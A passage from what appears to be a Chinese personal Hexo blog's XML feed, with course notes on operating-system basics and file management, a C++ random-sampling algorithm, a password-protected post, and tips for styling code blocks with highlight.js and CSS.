        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="c3d42d578793f50ad0431ae8ef932b0daa030ffefc2b0e64266d17c02fbc19c4">e32c27e47419b87d293b9e8ce412adf825bcb5f27fd0393e184a9f5b2ae1defd6ea39867474c47592638fe3d7757aed7ae4094d2c56eb031be4cd70b776a558564749a421c49843661fb4f12faac94f5fb0519ebd93e48a34fb1cb10ebf49e7abe0940037285c3587f9df3945ff49ed84f4b2a25928c21b040b795d5c1cecf7e508597b52bddfb1dd18f668d90419fa200e732e392ff95fb7886c43a7d9f1e1ff4246cf981d3cc789e61885257824ba8756d6e929cd776d1a593408899026c84e523d513a45dff979bf527f2e94ffac2bb3d1fce233bbf97e2158107dae48c6d10a1c3d906c614fb4cf51bc3af96a2d5206c0ffd4bea27ad57ffe8cdfe9f9d5cee92b6b924a3505443e0124a49214c183547e701a9f8c66c912b5981ce6e7da211473dbf856ce9b6d36ff5a31c87f9fd5b655a461cf7d8d60f91ec8ac444c14e73c92c5cf4a89067c75c83451dcf93b5bfeea846bca479e445041b58b4d36323e073be2d53b00ee8dcad0bb39b794c83d1b00a90afdcebabc5995e06e26db64d33556d20875fced3c50ed56beea5e1e5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-第一章-概论</title>
      <link href="/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E6%A6%82%E8%AE%BA/"/>
      <url>/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E6%A6%82%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<!--more-->  <h2 id="目标和作用"><a href="#目标和作用" class="headerlink" title="目标和作用"></a>目标和作用</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ol><li>方便性（对用户）  </li><li>有效性（提高资源利用率、提高系统的吞吐量）  </li><li>可扩充性（无结构-&gt;模块化-&gt;层次化-&gt;微内核结构能方便地增添新的功能和模块）  </li><li>开放性（更好的兼容，遵循世界标准规范OSI）  </li></ol><p><font color = "red"><strong>方便性和有效性</strong>是两个<strong>最重要</strong>的目标</font>  </p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>用户和计算机硬件系统之间的接口  </li><li>计算机系统资源的管理者（处理机、存储器、I/O设备、文件）  </li><li>实现对计算机资源的抽象  </li></ol><h3 id="推动操作系统发展的主要动力"><a href="#推动操作系统发展的主要动力" class="headerlink" title="推动操作系统发展的主要动力"></a>推动操作系统发展的主要动力</h3><ol><li>不断提高计算机资源利用率  </li><li>方便用户  </li><li>器件的不断更新迭代  </li><li>计算机体系结构的不断发展  </li><li>不断提出新的应用需求  </li></ol><h2 id="发展过程"><a href="#发展过程" class="headerlink" title="发展过程"></a>发展过程</h2><h3 id="未配置操作系统的计算机系统"><a href="#未配置操作系统的计算机系统" class="headerlink" title="未配置操作系统的计算机系统"></a>未配置操作系统的计算机系统</h3><ol><li>人工操作方式<br>利用率低，出现人机矛盾<br>CPU和I/O设备之间速度不匹配  </li><li>脱机输入/输出方式  </li></ol><h3 id="单道批处理系统"><a href="#单道批处理系统" class="headerlink" title="单道批处理系统"></a>单道批处理系统</h3><ol><li>处理过程  </li><li>缺点<br>系统中的资源得不到充分的利用  </li></ol><h3 id="多道批处理程序"><a href="#多道批处理程序" class="headerlink" title="多道批处理程序"></a>多道批处理程序</h3><ol><li>基本概念<br>为了提高资源的利用率和系统的吞吐量，将提交的作业先存放在外存中，排成<strong>后备队列</strong>，由作业调度程序调度。  </li><li>优缺点<br>(1)资源利用率高<br>(2)系统吞吐量大<br>(3)平均周转时间长<br>(4)无交互能力  </li><li>需要解决的问题  </li></ol><h3 id="分时系统"><a href="#分时系统" class="headerlink" title="分时系统"></a>分时系统</h3><ol><li>引入<br>满足用户对人机交互的需求<br>需求：人机交互、共享主机  </li><li>实现的关键问题<br>（1）及时接收：多路卡-分时多路复用<br>（2）及时处理<br>   作业直接进入内存<br>   采用轮转运行方式  </li><li>特征<br>（1）多路性<br>（2）独立性<br>（3）及时性<br>（4）交互性  </li></ol><h3 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h3><p>做出实时或及时的反应  </p><ol><li>实时系统的类型<br>（1）工业（武器）控制系统<br>（2）信息查询系统<br>（3）多媒体系统<br>（4）嵌入式系统  </li><li>实时任务的类型<br>（1）周期性实时任务和非周期性实时任务<br>（2）硬实时任务和软实时任务（是否必须满足对截止时间的要求）  </li><li>实时系统与分时系统特征的比较<br>（1）多路性<br>（2）独立性<br>（3）及时性<br>（4）交互性<br>（5）可靠性  </li></ol><h3 id="微机操作系统的发展"><a href="#微机操作系统的发展" class="headerlink" title="微机操作系统的发展"></a>微机操作系统的发展</h3><ol><li>单用户单任务操作系统：CP/M,MS-DOS  </li><li>单用户多任务操作系统：Windows  </li><li>多用户多任务操作系统：Unix OS（Solaris OS，Linux OS）  </li></ol><h2 id="操作系统的基本特性"><a href="#操作系统的基本特性" class="headerlink" title="操作系统的基本特性"></a>操作系统的基本特性</h2><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><p>使操作系统有效地提高系统中的资源利用率，增加系统的吞吐量  </p><ol><li>并行与并发<br>并发性：两个或多个事件<strong>同一时间间隔</strong>发生（宏观上）<br>并行性：两个或多个事件<strong>同一时刻</strong>发生  </li><li>引入进程<br><strong>进程是系统中能独立运行并作为资源分配的基本单位</strong>，是能独立运行的活动实体。<br>进程和并发是现代操作系统中最重要的基本概念，和操作系统运行的基础  </li></ol><h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><p>资源复用，供内存多个并发执行的进程共同使用，限定了时间和地点。<br>实现资源共享的方式：  </p><ol><li>互斥共享方式  </li><li>同时访问方式  </li></ol><p>并发和共享是多用户（多任务）OS中最基本的特征。互为存在条件。  </p><h3 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h3><ol><li>时分复用技术（利用处理机的空闲时间运行其他程序，提高处理机的利用率）<br>（1）虚拟处理机技术<br>（2）虚拟设备技术  </li><li>空分复用技术（利用存储器的空闲时间分区域存放和运行其他的多道程序，提高内存的利用率）  </li></ol><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><p>进程是以人们不可预知的速度向前推进的。  </p><h2 id="操作系统的主要功能"><a href="#操作系统的主要功能" class="headerlink" title="操作系统的主要功能"></a>操作系统的主要功能</h2><h3 id="处理机管理功能"><a href="#处理机管理功能" class="headerlink" title="处理机管理功能"></a>处理机管理功能</h3><ol><li>进程控制（创建、撤销进程，控制进程在运行过程中的状态转换）  </li><li>进程同步（信号量机制）  </li><li>进程通信（交换信息）  </li><li>调度（作业调度和进程调度）  </li></ol><h3 id="存储器管理功能"><a href="#存储器管理功能" class="headerlink" title="存储器管理功能"></a>存储器管理功能</h3><ol><li>内存分配<br>（1）静态分配<br>（2）动态分配  </li><li>内存保护  </li><li>地址映射  </li><li>内存扩充（虚拟存储技术）<br>（1）请求调入功能<br>（2）置换功能  </li></ol><h3 id="设备管理功能"><a href="#设备管理功能" class="headerlink" title="设备管理功能"></a>设备管理功能</h3><p>(1)完成用户进程提出的I/O请求,为用户进程分配所需的I/O设备,并完成指定的I/O操作。<br>(2)提高CPU和I/O设备的利用率，提高I/O速度，方便用户使用I/O设备。  </p><ol><li>缓冲管理  </li><li>设备分配  </li><li>设备处理  </li></ol><p>CPU向设备控制器发出I/O命令，要求它完成指定的I/O操作；CPU接收从控制器发来的中断请求，并给予迅速的响应和相应的处理。  </p><h3 id="文件管理功能"><a href="#文件管理功能" class="headerlink" title="文件管理功能"></a>文件管理功能</h3><ol><li>文件存储空间的管理  </li><li>目录管理  </li><li>文件的读/写管理和保护  </li></ol><h3 id="操作系统与用户之间的接口"><a href="#操作系统与用户之间的接口" class="headerlink" title="操作系统与用户之间的接口"></a>操作系统与用户之间的接口</h3><ol><li>用户接口<br>（1）联机用户接口<br>（2）脱机用户接口<br>（3）图形用户接口  </li><li>程序接口  </li></ol><h3 id="现代操作系统的新功能"><a href="#现代操作系统的新功能" class="headerlink" title="现代操作系统的新功能"></a>现代操作系统的新功能</h3><ol><li>系统安全<br>（1）认证技术<br>（2）密码技术<br>（3）访问控制技术<br>（4）反病毒技术  </li><li>网络的功能和服务<br>（1）网络通信<br>（2）资源管理<br>（3）应用互操作  </li><li>支持多媒体<br>（1）接纳控制能力<br>（2）实时调度<br>（3）多媒体文件的存储  </li></ol><h2 id="OS结构设计"><a href="#OS结构设计" class="headerlink" title="OS结构设计"></a>OS结构设计</h2><h3 id="传统操作系统结构"><a href="#传统操作系统结构" class="headerlink" title="传统操作系统结构"></a>传统操作系统结构</h3><ol><li>无结构操作系统  </li><li>模块化操作系统  </li><li>分层式操作系统  </li></ol><h3 id="客户-服务器模式简介"><a href="#客户-服务器模式简介" class="headerlink" title="客户/服务器模式简介"></a>客户/服务器模式简介</h3><ol><li>组成<br>（1）客户机<br>（2）服务器<br>（3）网络系统  </li><li>交互  </li><li>优点  </li></ol><h3 id="面向对象程序设计技术简介"><a href="#面向对象程序设计技术简介" class="headerlink" title="面向对象程序设计技术简介"></a>面向对象程序设计技术简介</h3><ol><li>基本概念  </li><li>优点  </li></ol><h3 id="微内核OS结构"><a href="#微内核OS结构" class="headerlink" title="微内核OS结构"></a>微内核OS结构</h3><ol><li>基本概念<br>（1）足够小的内核<br>（2）基于客户/服务器模式<br>（3）应用“机制与策略分离”原理<br>（4）采用面向对象技术  </li><li>基本功能<br>（1）进程（线程）管理<br>（2）低级存储器管理<br>（3）中断和陷入处理  </li><li>优点<br>（1）提高了系统的可扩展性<br>（2）增强了系统的可靠性<br>（3）可移植性强<br>（4）提供对分布式系统的支持<br>（5）融入了面向对象技术  </li><li>存在的问题<br>运行效率有所降低  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机抽样算法</title>
      <link href="/2020/ACM/%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7%E7%AE%97%E6%B3%95/"/>
      <url>/2020/ACM/%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个算法从n个记录中选取m个记录</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当从n个记录中选取m个时，根据概率论中的抽签模型，每个记录被抽到的概率是一样的，都为m/n。因此根据这个原理编写算法如下：<br>依次对n个记录进行判断，如果当前随机产生的值小于当前概率，则选取这条记录。<br>时间复杂度分析：O(n)</p><p>算法描述：void select(int n,int m,int s[])<br>输入：记录总数n，选取数m，选择记录数组s[]<br>输出：选择记录数组s[]<br>过程：<br>1.遍历n个记录，同时记录已经选取的记录数x<br>2.随机生成一个数r在0-1之间<br>3.if(r&lt;(m-x)/(n-i-1)) （即如果u&lt;当前该记录被选择的概率），就选择该记录<br>4.否则，遍历下一条记录。<br>5.当m个记录都被选择之后，就直接退出循环</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> m<span class="token punctuation">,</span><span class="token keyword">int</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    RandomNumber rnd<span class="token punctuation">;</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//记录已经被选择的个数</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token operator">&amp;&amp;</span>x<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//当m个记录选择完时直接退出循环</span>    <span class="token punctuation">{</span>      <span class="token keyword">double</span> r <span class="token operator">=</span> rnd<span class="token punctuation">.</span><span class="token function">fRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//随机生成0-1之间的数</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>i<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>m<span class="token operator">-</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//改用乘法更便于判断</span>      <span class="token punctuation">{</span>          x<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//被选择的数+1</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第i个被选择</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://segmentfault.com/a/1190000017393009" target="_blank" rel="noopener">随机抽样算法</a></p>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随机化算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散数学-集合论</title>
      <link href="/2020/learning/2019-2020s/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E9%9B%86%E5%90%88%E8%AE%BA/"/>
      <url>/2020/learning/2019-2020s/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E9%9B%86%E5%90%88%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<!--more-->]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 离散数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo美化</title>
      <link href="/2020/CS/hexo%E7%BE%8E%E5%8C%96/"/>
      <url>/2020/CS/hexo%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="代码高亮美化"><a href="#代码高亮美化" class="headerlink" title="代码高亮美化"></a>代码高亮美化</h2><h3 id="高亮部分"><a href="#高亮部分" class="headerlink" title="高亮部分"></a>高亮部分</h3><p>在head.ejs中添加</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.bootcdn.net/ajax/libs/highlight.js/10.0.3/styles/tomorrow-night.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token comment" spellcheck="true">// highlight</span>  hljs<span class="token punctuation">.</span><span class="token function">initHighlightingOnLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="加上行号"><a href="#加上行号" class="headerlink" title="加上行号"></a>加上行号</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'pre code'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> block<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//hljs.highlightBlock(block);</span>    <span class="token keyword">var</span> lines <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> $numbering <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;ul/>'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'pre-numbering'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'has-numbering'</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$numbering<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>lines<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      $numbering<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;li/>'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>css部分</p><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">code<span class="token class">.has-numbering</span> </span><span class="token punctuation">{</span>  <span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">1.7</span>em <span class="token important">!important</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*因为显示行号，所以离左边有一定的距离*/</span>  <span class="token property">word-wrap</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>   <span class="token property">word-break</span><span class="token punctuation">:</span> keep-all<span class="token punctuation">;</span>  <span class="token property">white-space</span><span class="token punctuation">:</span> pre<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">pre</span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>  <span class="token property">max-height</span><span class="token punctuation">:</span> <span class="token number">750</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">pre ul li</span><span class="token punctuation">{</span>  <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">0</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.article-entry</span> pre ul li<span class="token pseudo-element">:before</span></span><span class="token punctuation">{</span>  <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.pre-numbering</span> </span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*绝对定位*/</span>  <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">2.2</span>em<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*行号的宽度*/</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span>em <span class="token number">0.2</span>em <span class="token number">0.9</span>em <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*上下padding保持与&lt;code>一致，不然出现错位*/</span>  <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">3</span>px <span class="token number">0</span> <span class="token number">0</span> <span class="token number">3</span>px<span class="token punctuation">;</span>  <span class="token property">text-align</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">0.5</span>em<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*字体大小与&lt;code>一致*/</span>  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#AAA</span><span class="token punctuation">;</span>  <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="加上滚动条"><a href="#加上滚动条" class="headerlink" title="加上滚动条"></a>加上滚动条</h3><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">pre code</span><span class="token punctuation">{</span>  <span class="token property">overflow-x</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>  <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>  <span class="token property">word-break</span><span class="token punctuation">:</span> keep-all<span class="token punctuation">;</span>  <span class="token property">white-space</span><span class="token punctuation">:</span> pre<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="部署到服务器"><a href="#部署到服务器" class="headerlink" title="部署到服务器"></a>部署到服务器</h2><p><code>npm install --save hexo-deployer-git</code></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-第七章-文件管理</title>
      <link href="/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/"/>
      <url>/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<!--more-->  <p>程序和数据以文件的形式存储在外存中。<br>文件系统，负责文件的组织、存储和访问  </p><h2 id="文件和文件系统"><a href="#文件和文件系统" class="headerlink" title="文件和文件系统"></a>文件和文件系统</h2><p>应用程序运行是为了对数据进行处理，那么这些数据来自什么地方？<br>内存<br>缺点：容量有限、不持久、难以共享<br>永久介质—-磁盘<br>优点：大容量、低成本、持久、共享<br>存在的问题：  </p><ul><li>一般用户使用磁盘困难：怎样驱动磁盘、怎么定位数据  </li><li>解决方式：文件系统<br>用户无需知道存放具体位置、如何存放、如何打开以及磁盘的工作原理…  </li></ul><p>文件的定义：是记录在<strong>外存</strong>上的，具有<strong>符号名</strong>的，在逻辑上具有<strong>完整意义</strong>的一组相关<strong>信息项</strong>的集合。<br>信息项：是构成文件内容的基本单位，可以是一个字符，也可以是一个记录，也可以是一个数据项。  </p><h3 id="文件的组成部分"><a href="#文件的组成部分" class="headerlink" title="文件的组成部分"></a>文件的组成部分</h3><ol><li>文件体：文件本身的信息  </li><li>文件说明：文件存储和管理信息（包括文件属性、文件控制块（FCB）、目录项）<br>• 文件名称<br>• 文件内部标识符<br>• 文件类型<br>• 文件存储位置<br>• 文件大小<br>• 访问权限<br>• 时间、日期、用户标识  <h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3>所有的计算机应用程序都要：<strong>存储信息和检索信息</strong><br>三个基本要求：  </li></ol><ul><li>能够存储大量的信息  </li><li>长期保存信息  </li><li>可以共享信息  </li></ul><p>解决方法：把信息以一种单元，即文件的形式存储在磁盘或其他外部介质上。通过文件系统来进行管理的，包括：文件的结构，命名，存取，使用，保护和实现方法。  </p><p>文件系统的定义：操作系统中负责存取和管理文件信息的模块称为文件系统。它负责管理文件的存储、检索、更新、共享和保护，并为用户提供一整套方便有效的文件使用和操作方法。<br>对于用户：  </p><ul><li>基本目标：实现“按名存取”。   </li><li>提供方便的操作和统一的调用接口，屏蔽底层细节<br>对于系统：  </li><li>组织、分配、回收文件的存储空间。  </li><li>负责文件的存储、检索、共享和保护。  </li><li>重要目标：提高文件存取速度  </li></ul><h3 id="文件系统的结构"><a href="#文件系统的结构" class="headerlink" title="文件系统的结构"></a>文件系统的结构</h3><p><img src="/images/pasted-21.png" alt="upload successful" loading="lazy">  </p><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><ul><li>名字 – 文件名称唯一，以用户容易读取的形式加以引用  </li><li>标识符——标识文件系统内文件的唯一标识，一般为数字，对用户不可读  </li><li>类型 –被支持不同类型的文件系统所使用  </li><li>位置 –指向设备和设备上文件位置的指针  </li><li>大小 –文件当前大小（字节、字、块）  </li><li>保护– 决定谁能读、写、执行等的访问控制信息  </li><li>时间、日期和用户标识–文件创建、上次修改、和上次访问<br>所有文件的信息都保存在目录中。  </li></ul><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>为了便于对文件进行存取和管理，文件系统为所有的文件建立了目录，每个文件在目录中都有一个登记项，称为文件目<br>录项，每个目录项记录着一个文件的名字及其外存地址等该文件的管理和使用信息。  </p><ul><li>实现文件按名字存取；  </li><li>实现文件共享和保护。<br>文件目录项又称为文件控制块（File Control Block，FCB），它除了记录文件名字和外存地址外，通常还保存了文件的创建者、创建日期、访问权限和长度等。<br>有些系统中，目录也以特殊文件形式进行保存，称为“目录文件”。  <h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3>许多OS中用文件的扩展名表征文件类型。  </li></ul><ol><li>按用途分  <ul><li>系统文件  </li><li>用户文件  </li><li>库文件（由标准子程序及常用的例程等构成的文件，允许调用，不允许修改）  </li></ul></li><li>按文件中的数据形式分：<br>1）源文件：由源程序和数据构成的文件<br>2）目标文件：编译后的二进制代码文件<br>3）可执行文件：目标文件链接后形成的文件  </li><li>按存取控制属性分：<br>只执行文件、只读文件、读写文件  </li><li>按组织形式和处理方式分：<br>普通文件：用户建立的文件<br>目录文件：管理文件系统<br>特殊文件：各类I/O设备  </li></ol><h3 id="文件系统模型图"><a href="#文件系统模型图" class="headerlink" title="文件系统模型图"></a>文件系统模型图</h3><p><img src="/images/pasted-22.png" alt="upload successful" loading="lazy">  </p><ol><li>对象及其属性：(底层)<br>对象包括文件、目录、磁盘存储空间  </li><li>对对象进行操纵和管理的软件集合（核心）<br>存储空间的管理；<br>文件目录的管理；<br>地址映射；<br>文件的读写管理；<br>文件的共享与保护  </li><li>文件系统的接口：<br>命令接口、程序接口  </li></ol><h3 id="文件系统对文件操作"><a href="#文件系统对文件操作" class="headerlink" 